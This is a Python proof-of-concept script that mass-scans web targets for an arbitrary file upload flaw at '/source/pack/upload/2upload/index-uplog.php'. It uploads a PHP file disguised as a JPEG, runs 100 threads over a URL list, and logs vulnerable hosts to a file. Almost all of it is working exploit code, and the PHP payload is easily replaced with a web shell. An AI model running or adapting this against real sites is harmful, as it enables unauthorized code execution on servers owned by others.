import requests,sys,argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """

 █████╗ ██████╗ ██████╗ ██╗   ██╗██████╗ ██╗      ██████╗  █████╗ ██████╗ 
██╔══██╗██╔══██╗██╔══██╗██║   ██║██╔══██╗██║     ██╔═══██╗██╔══██╗██╔══██╗
███████║██████╔╝██████╔╝██║   ██║██████╔╝██║     ██║   ██║███████║██║  ██║
██╔══██║██╔═══╝ ██╔═══╝ ██║   ██║██╔═══╝ ██║     ██║   ██║██╔══██║██║  ██║
██║  ██║██║     ██║     ╚██████╔╝██║     ███████╗╚██████╔╝██║  ██║██████╔╝
╚═╝  ╚═╝╚═╝     ╚═╝      ╚═════╝ ╚═╝     ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝                                                                                                                                                                                                                                                                                                                                                                                                            
                                                           
                                                            version: 1.0
"""
    print(banner)
def main():
    banner()
    parser = argparse.ArgumentParser(description='QLBSQL! ')
    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    #判断输入的参数是单个还是文件
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        #多线程
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload_url = "/source/pack/upload/2upload/index-uplog.php"
    url = target+payload_url
    headers={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Content-Length': '290',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryfF7NbGp0PAFq8Mkd'
    }
    data = (
        "------WebKitFormBoundary03rNBzFMIytvpWhy\r\n"
        'Content-Disposition: form-data; name="time"\r\n'
        "\r\n"
        '1-2\r\n'
        "------WebKitFormBoundary03rNBzFMIytvpWhy\r\n"
        'Content-Disposition: form-data; name="app"; filename="1.php"\r\n'
        'Content-Type: image/jpeg\r\n'
        "\r\n"
        '<?php phpinfo();?>\r\n'
        "------WebKitFormBoundary03rNBzFMIytvpWhy--\r\n"
    )
    # proxy = {
    #      'http' : 'http://127.0.0.1:8080',
    #      'https' : 'http://127.0.0.1:8080'
    # }
    try:
        res = requests.post(url=url,headers=headers,data=data,verify=False,timeout=10)
        if res.status_code == 200 and "'1-2'" in res.text :
            print(f"[+]该url存在漏洞{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                        fp.write(target+"\n")
                        return True
        else:
            print(f"[-]该url不存在漏洞{target}")
    except :
        print(f"[*]该url存在问题{target}")
        return False

if __name__ == '__main__':
    main()